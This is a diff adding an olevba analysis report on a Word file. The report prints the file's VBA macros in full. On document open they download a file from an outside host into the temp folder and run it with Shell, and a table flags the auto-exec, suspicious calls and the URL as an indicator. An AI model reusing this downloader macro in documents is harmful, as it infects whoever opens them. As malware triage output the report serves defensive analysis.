@@ -1,0 +1,61 @@
+olevba 0.54.1 on Python 3.6.7 - http://decalage.info/python/oletools
+===============================================================================
+FILE: 64B06FB830593E3373685262B1DCE9C5
+Type: OpenXML
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Private Sub Document_Open()
+    funo
+End Sub
+
+-------------------------------------------------------------------------------
+VBA MACRO Module1.bas 
+in file: word/vbaProject.bin - OLE stream: 'VBA/Module1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+#If VBA7 Then
+Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
+        Alias "URLDownloadToFileA" (ByVal pCaller As Long, _
+                                    ByVal szURL As String, ByVal szFileName As String, _
+                                    ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
+#Else
+Private Declare Function URLDownloadToFile Lib "urlmon" _
+        Alias "URLDownloadToFileA" (ByVal pCaller As Long, _
+                                    ByVal szURL As String, ByVal szFileName As String, _
+                                    ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
+#End If
+Public Sub Download(Param1, Param2, Param3)
+    URLDownloadToFile 0, Param1, Param2, 0, 0
+End Sub
+Sub funo()
+    Dim LinksArr As Variant
+    LinksArr = Array(getLnk)
+    TmpFile = Environ("temp") & "\vuyj43." & "tmp"
+    If IsArray(LinksArr) = True Then
+        Download LinksArr(0), TmpFile, False
+        Shell TmpFile
+    End If
+End Sub
+
+-------------------------------------------------------------------------------
+VBA MACRO Module2.bas 
+in file: word/vbaProject.bin - OLE stream: 'VBA/Module2'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Function getLnk() As String
+    getLnk = "http://achmannatgagamico.info/word77.tmp"
+End Function
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
+|          |                    |opened                                       |
+|Suspicious|Environ             |May read system environment variables        |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|Lib                 |May run code from a DLL                      |
+|Suspicious|URLDownloadToFileA  |May download files from the Internet         |
+|IOC       |http://achmannatgaga|URL                                          |
+|          |mico.info/word77.tmp|                                             |
++----------+--------------------+---------------------------------------------+
+
